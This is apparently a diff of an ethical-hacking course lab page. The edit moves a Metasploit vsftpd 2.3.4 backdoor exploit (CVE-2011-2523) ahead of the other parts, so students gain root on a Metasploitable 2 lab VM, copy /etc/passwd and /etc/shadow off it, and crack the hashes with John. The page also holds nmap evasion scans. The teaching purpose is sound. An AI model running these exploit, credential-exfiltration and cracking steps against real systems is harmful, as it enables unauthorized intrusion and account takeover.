@@ -55,10 +55,10 @@ main{min-width:0} pre,pre.out{overflow-x:auto;max-width:100%}
 <a href="#start">Before you start<span></span></a>
 <a href="#p0">Part 0 &mdash; Setup<span></span></a>
 <a href="#p1">Part 1 &mdash; Evasion<span>after Sec 1</span></a>
-<a href="#p2">Part 2 &mdash; Credentials<span>after Sec 2</span></a>
-<a href="#p3">Part 3 &mdash; Methodology<span>after Sec 3</span></a>
+<a href="#p2">Part 2 &mdash; Gain access &amp; grab creds<span>Metasploit first</span></a>
+<a href="#p3">Part 3 &mdash; Read the creds<span>after Sec 2</span></a>
 <a href="#p4">Part 4 &mdash; Cracking<span>after Sec 4</span></a>
-<a href="#p5">Part 5 &mdash; Gaining access<span>after Sec 5</span></a>
+<a href="#p5">Part 5 &mdash; Methodology<span>after Sec 3</span></a>
 <a href="#p3a">Phase 3a wrap<span></span></a>
 <a href="#resources">Resources<span></span></a>
 <div class="tools"><button onclick="all_(true)">Show all solutions</button><button onclick="all_(false)">Hide all solutions</button></div></nav>
@@ -66,7 +66,7 @@ main{min-width:0} pre,pre.out{overflow-x:auto;max-width:100%}
 
 <div class="card" id="start"><h2>Before you start</h2>
 <ul>
-<li><b>How class runs:</b> after each lecture section we do the matching lab part together, labelled <em>Do together after Section N</em>. Keep the command-along page open too &mdash; it has the predict &rarr; run &rarr; read rhythm for every step here.</li>
+<li><b>How class runs today:</b> we run the Metasploit gaining-access step <b>early</b> (Part 2) so we land a root shell, pull <code>/etc/passwd</code> and <code>/etc/shadow</code> off the box, then read those files (Part 3) and crack them (Part 4). Keep the command-along page open too &mdash; it has the predict &rarr; run &rarr; read rhythm for every step here.</li>
 <li><b>Get the zip:</b> download <code>week5-lab-assets-student.zip</code> and unzip it next to this file so <code>lab-assets/</code> paths resolve.</li>
 <li><b>Primary target:</b> live Metasploitable 2 + Kali on a <b>host-only</b> network, never bridged. Fallback files in the zip are for students with no VM and are clearly labelled <em>fallback only</em>.</li>
 <li><b>Set your shortcut:</b> <code>MS2=&lt;your Metasploitable 2 IP&gt;</code> (often 192.168.56.101/102). We reuse <code>$MS2</code> throughout.</li>
@@ -111,51 +111,75 @@ sudo nmap -sS -Pn --source-port 53 -T2 -p 21,22,80,445 $MS2 # trusted source por
 <button class="solbtn" onclick="tog('s11')">Show / hide solution</button><div class="sol" id="s11"><b>Checkpoint:</b> open Wireshark/tcpdump during the <code>-f</code> scan and confirm tiny IP fragments. Drop <code>-f</code> first if a firewall reassembles fragments. Full transcript: <code>lab-assets/sample-output/nmap-evasion.txt</code>.</div>
 </div></div>
 
-<div class="part" id="p2"><div class="phead"><h2>Part 2 &mdash; Credential stores</h2></div>
-<div class="together">Do together after Section 2 (Windows &amp; Linux security architecture)</div>
-<div class="goal"><b>Goal:</b> see where Linux keeps account names vs hashes, and read one hash field by field.</div>
+<div class="part" id="p2"><div class="phead"><h2>Part 2 &mdash; Gain access &amp; grab the credential files</h2></div>
+<div class="together">Do together with the Metasploit demo &mdash; we run this early so the credential files are in hand for Parts 3&ndash;4</div>
+<div class="goal"><b>Goal:</b> turn one real vulnerability (CVE-2011-2523) into a root session (CEH Phase 3), then copy <code>/etc/passwd</code> and <code>/etc/shadow</code> off the box as evidence.</div>
 
-<div class="task"><h3>2.1 &mdash; passwd, shadow, SUID</h3>
+<div class="task"><h3>2.1 &mdash; vsftpd 2.3.4 backdoor &rarr; root shell</h3>
 <div class="lbl">Do this (exact commands)</div>
-<pre>cat /etc/passwd | head        # world-readable account list ('x' = hash is elsewhere)
-cat /etc/shadow               # root only: the hashes
-ls -l /usr/bin/passwd         # note the SUID 's' bit</pre>
+<pre>msfconsole -q
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS $MS2
+run
+id ; hostname ; uname -a      # inside the session: proof of access</pre>
 <div class="lbl">What each part means</div>
-<div class="explain"><code>cat</code> prints a file &middot; <code>/etc/passwd</code> names + UIDs (UID 0 = root) &middot; <code>/etc/shadow</code> the <code>$id$salt$hash</code> entries &middot; <code>ls -l</code> shows permission bits; the <code>s</code> on passwd is the Set-User-ID bit.</div>
+<div class="explain"><code>search</code> finds the module &middot; <code>use</code> loads it &middot; <code>set RHOSTS</code> the target &middot; <code>run</code> fires it. No <code>set PAYLOAD</code> &mdash; the backdoor opens its own root shell on TCP 6200. <code>id</code>/<code>hostname</code>/<code>uname -a</code> are your proof.</div>
+<div class="lbl">What you should see</div>
+<pre class="out">[+] UID: uid=0(root) gid=0(root)
+[*] Command shell session 1 opened
+uid=0(root) gid=0(root)</pre>
+<div class="lbl">What it means</div>
+<div class="explain">Vulnerability = CVE-2011-2523; exploit = the module; session = your root shell = <b>gaining access, Phase 3</b>. Because you are now root, you can read the credential store that a normal user cannot &mdash; that is why we do this step first.</div>
+<button class="solbtn" onclick="tog('s51')">Show / hide solution</button><div class="sol" id="s51">No payload was needed because the backdoor carries its own shell. Today&rsquo;s framing (CEH gaining-access phase + vocabulary) differs from the Friday engagement framing (minimum proof for a client report). Fallback: <code>lab-assets/sample-output/vsftpd-exploit.txt</code>.</div>
+</div>
+
+<div class="task"><h3>2.2 &mdash; Exfiltrate passwd + shadow</h3>
+<div class="lbl">Do this (inside the root session)</div>
+<pre>cat /etc/passwd               # world-readable account list
+cat /etc/shadow               # root only &mdash; you can read it now because you are root</pre>
+<div class="lbl">Then save them on Kali for cracking</div>
+<pre>mkdir -p ~/eth-evidence
+# paste each file's contents into these, or use the session's download:
+#   (meterpreter) download /etc/passwd ; download /etc/shadow
+# plain shell: copy-paste the cat output into the files below
+nano ~/eth-evidence/passwd.txt     # paste /etc/passwd
+nano ~/eth-evidence/shadow.txt     # paste /etc/shadow</pre>
+<div class="lbl">What it means</div>
+<div class="explain">You now hold the two files locally on Kali: <code>passwd.txt</code> (names + UIDs) and <code>shadow.txt</code> (the <code>$id$salt$hash</code> entries). Part 3 reads them field by field; Part 4 cracks <code>shadow.txt</code>. <b>No VM?</b> use <code>lab-assets/shadow.txt</code> as the labelled fallback.</div>
+<button class="solbtn" onclick="tog('s22')">Show / hide solution</button><div class="sol" id="s22">If you have a meterpreter session, <code>download /etc/passwd</code> and <code>download /etc/shadow</code> pull the files straight to your Kali working directory. From the plain vsftpd shell, <code>cat</code> each file and paste it into the local copies. Capture proof (id/hostname/uname -a), then stop &mdash; gain access and prove it, do not damage the box.</div>
+</div></div>
+
+<div class="part" id="p3"><div class="phead"><h2>Part 3 &mdash; Read the credential stores</h2></div>
+<div class="together">Do together after Section 2 (Windows &amp; Linux security architecture)</div>
+<div class="goal"><b>Goal:</b> see where Linux keeps account names vs hashes, and read one hash field by field &mdash; using the files you grabbed in Part 2.</div>
+
+<div class="task"><h3>3.1 &mdash; passwd, shadow, SUID</h3>
+<div class="lbl">Do this (exact commands)</div>
+<pre>head ~/eth-evidence/passwd.txt   # the account list you grabbed ('x' = hash is elsewhere)
+cat  ~/eth-evidence/shadow.txt   # the hashes you grabbed as root in Part 2
+ls -l /usr/bin/passwd            # on the target: note the SUID 's' bit</pre>
+<div class="lbl">What each part means</div>
+<div class="explain"><code>/etc/passwd</code> names + UIDs (UID 0 = root) &middot; <code>/etc/shadow</code> the <code>$id$salt$hash</code> entries &middot; <code>ls -l</code> shows permission bits; the <code>s</code> on passwd is the Set-User-ID bit.</div>
 <div class="lbl">What you should see</div>
 <pre class="out">msfadmin:$1$msfadmin$rhyK715KFaBMnilXFzf10/:19000:0:99999:7:::
 -rwsr-xr-x 1 root root ... /usr/bin/passwd</pre>
 <div class="lbl">What it means</div>
-<div class="explain">The hash lives in shadow, not passwd. <code>$1$</code> = md5crypt; <code>msfadmin</code> = salt; the long chunk = hash. The SUID <code>s</code> is why a normal user can change their own password. Copy <code>/etc/shadow</code> into your evidence folder for Part 4.</div>
+<div class="explain">The hash lives in shadow, not passwd. <code>$1$</code> = md5crypt; <code>msfadmin</code> = salt; the long chunk = hash. The SUID <code>s</code> is why a normal user can change their own password. This <code>shadow.txt</code> is the input for Part 4.</div>
 <button class="solbtn" onclick="tog('s21')">Show / hide solution</button><div class="sol" id="s21"><b>Field map:</b> username : <code>$id$</code> (algorithm) <code>$salt$</code> <code>hash</code> : lastchange : min : max : warn : : :. For sha512 the id is <code>$6$</code>. Fallback: <code>lab-assets/sample-output/shadow-cat.txt</code>, <code>passwd-ls.txt</code>.</div>
-</div></div>
-
-<div class="part" id="p3"><div class="phead"><h2>Part 3 &mdash; Methodology map</h2></div>
-<div class="together">Do together after Section 3 (CEH system-hacking methodology)</div>
-<div class="goal"><b>Goal:</b> place today's actions into the four system-hacking stages and the five phases (no new commands &mdash; a 5-minute reasoning task).</div>
-<div class="task"><h3>3.1 &mdash; Which stage, which phase?</h3>
-<div class="lbl">Do this</div>
-<p>For each action, write the stage (gain access / escalate / maintain / clear tracks) and the CEH phase:</p>
-<ol>
-<li>You exploit the vsftpd backdoor and land a shell.</li>
-<li>You abuse a SUID-root binary to go from a normal user to root.</li>
-<li>You add a hidden admin account to survive a reboot.</li>
-<li>You clear <code>/var/log/auth.log</code>.</li>
-</ol>
-<button class="solbtn" onclick="tog('s31')">Show / hide solution</button><div class="sol" id="s31">1 = gain access (Phase 3); 2 = escalate privileges (Phase 3); 3 = maintain access (Phase 4); 4 = clear tracks (Phase 5). Gaining access and escalation are both Phase 3. An ethical hacker documents what could be cleared rather than destroying the client&rsquo;s logs.</div>
 </div></div>
 
 <div class="part" id="p4"><div class="phead"><h2>Part 4 &mdash; Password cracking &amp; rainbow tables</h2></div>
 <div class="together">Do together after Section 4 (cracking mechanism &amp; rainbow tables)</div>
-<div class="goal"><b>Goal:</b> crack a real md5crypt hash with John, then prove a salt beats a rainbow table but not a dictionary.</div>
+<div class="goal"><b>Goal:</b> crack the real md5crypt hashes you grabbed with John, then prove a salt beats a rainbow table but not a dictionary.</div>
 
 <div class="task"><h3>4.1 &mdash; Crack the Metasploitable 2 hashes</h3>
 <div class="lbl">Do this (exact commands)</div>
-<pre>cp /etc/shadow ~/eth-evidence/shadow.txt       # or use lab-assets/shadow.txt
+<pre>cd ~/eth-evidence                              # the shadow.txt you captured in Part 2
 john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
 john --show shadow.txt</pre>
 <div class="lbl">What each part means</div>
-<div class="explain"><code>john</code> the cracker &middot; <code>--format=md5crypt</code> these are <code>$1$</code> hashes &middot; <code>--wordlist=</code> the dictionary of candidates &middot; <code>shadow.txt</code> the hashes &middot; <code>--show</code> prints what was recovered (from john.pot).</div>
+<div class="explain"><code>john</code> the cracker &middot; <code>--format=md5crypt</code> these are <code>$1$</code> hashes &middot; <code>--wordlist=</code> the dictionary of candidates &middot; <code>shadow.txt</code> the hashes you grabbed &middot; <code>--show</code> prints what was recovered (from john.pot).</div>
 <div class="lbl">What you should see (VERIFIED recovered values)</div>
 <pre class="out">msfadmin:msfadmin
 user:user
@@ -181,32 +205,24 @@ bob:$1$Zz99Yy88$uYexDlgxuiAyQsFcWegJR0:...</pre>
 <button class="solbtn" onclick="tog('s42')">Show / hide solution</button><div class="sol" id="s42">Why different: md5crypt mixes the salt in before hashing. Rainbow table: will NOT work (no salt+password chains; you&rsquo;d need one table per salt). What cracks it: a dictionary attack with John/Hashcat. Fix for weak passwords = length + unpredictability, not just a salt.</div>
 </div></div>
 
-<div class="part" id="p5"><div class="phead"><h2>Part 5 &mdash; Gaining access</h2></div>
-<div class="together">Do together after Section 5 (Metasploit &mdash; gaining access)</div>
-<div class="goal"><b>Goal:</b> turn one real vulnerability (CVE-2011-2523) into a root session, framed as CEH Phase 3.</div>
-
-<div class="task"><h3>5.1 &mdash; vsftpd 2.3.4 backdoor</h3>
-<div class="lbl">Do this (exact commands)</div>
-<pre>msfconsole -q
-search vsftpd
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS $MS2
-run
-id ; hostname ; uname -a      # inside the session: proof of access</pre>
-<div class="lbl">What each part means</div>
-<div class="explain"><code>search</code> finds the module &middot; <code>use</code> loads it &middot; <code>set RHOSTS</code> the target &middot; <code>run</code> fires it. No <code>set PAYLOAD</code> &mdash; the backdoor opens its own root shell on TCP 6200. <code>id</code>/<code>hostname</code>/<code>uname -a</code> are your proof.</div>
-<div class="lbl">What you should see</div>
-<pre class="out">[+] UID: uid=0(root) gid=0(root)
-[*] Command shell session 1 opened
-uid=0(root) gid=0(root)</pre>
-<div class="lbl">What it means</div>
-<div class="explain">Vulnerability = CVE-2011-2523; exploit = the module; session = your root shell = <b>gaining access, Phase 3</b>. From here you could <code>cat /etc/shadow</code> (closing the loop with Part 4). Capture proof, then stop &mdash; gain access and prove it, do not damage the box.</div>
-<button class="solbtn" onclick="tog('s51')">Show / hide solution</button><div class="sol" id="s51">No payload was needed because the backdoor carries its own shell. Today&rsquo;s framing (CEH gaining-access phase + vocabulary) differs from the Friday engagement framing (minimum proof for a client report). Fallback: <code>lab-assets/sample-output/vsftpd-exploit.txt</code>.</div>
+<div class="part" id="p5"><div class="phead"><h2>Part 5 &mdash; Methodology map</h2></div>
+<div class="together">Do together after Section 3 (CEH system-hacking methodology)</div>
+<div class="goal"><b>Goal:</b> place today's actions into the four system-hacking stages and the five phases (no new commands &mdash; a 5-minute reasoning task).</div>
+<div class="task"><h3>5.1 &mdash; Which stage, which phase?</h3>
+<div class="lbl">Do this</div>
+<p>For each action, write the stage (gain access / escalate / maintain / clear tracks) and the CEH phase:</p>
+<ol>
+<li>You exploit the vsftpd backdoor and land a shell.</li>
+<li>You abuse a SUID-root binary to go from a normal user to root.</li>
+<li>You add a hidden admin account to survive a reboot.</li>
+<li>You clear <code>/var/log/auth.log</code>.</li>
+</ol>
+<button class="solbtn" onclick="tog('s31')">Show / hide solution</button><div class="sol" id="s31">1 = gain access (Phase 3); 2 = escalate privileges (Phase 3); 3 = maintain access (Phase 4); 4 = clear tracks (Phase 5). Gaining access and escalation are both Phase 3. An ethical hacker documents what could be cleared rather than destroying the client&rsquo;s logs.</div>
 </div></div>
 
 <div class="part" id="p3a"><div class="phead"><h2>Phase 3a wrap</h2></div>
 <div class="goal"><b>Goal:</b> assemble your evidence file. No new assignment this week &mdash; Week 6 is the midterm.</div>
-<div class="explain">Fill in <code>lab-assets/templates/phase3a-evidence-template.md</code> with: your four evasion scans, the shadow line you read (id + salt), your John results and why the salt didn&rsquo;t stop them, and your vsftpd session proof (id/hostname/uname -a). If you used a fallback for any part, say so.</div>
+<div class="explain">Fill in <code>lab-assets/templates/phase3a-evidence-template.md</code> with: your four evasion scans, your vsftpd session proof (id/hostname/uname -a), the shadow line you grabbed (id + salt), and your John results and why the salt didn&rsquo;t stop them. If you used a fallback for any part, say so.</div>
 <div class="note">Deadlines in this course are written as &ldquo;before midnight PT&rdquo;. Nothing new is due from today; keep building Phase 3a evidence and review Weeks 1&ndash;5 for the midterm.</div>
 </div>
 
@@ -222,6 +238,7 @@ uid=0(root) gid=0(root)</pre>
 </div>
 
 </main></div>
+
 <script>
 function tog(id){document.getElementById(id).classList.toggle('on');}
 function all_(on){document.querySelectorAll('.sol').forEach(function(s){s.classList.toggle('on',on);});}
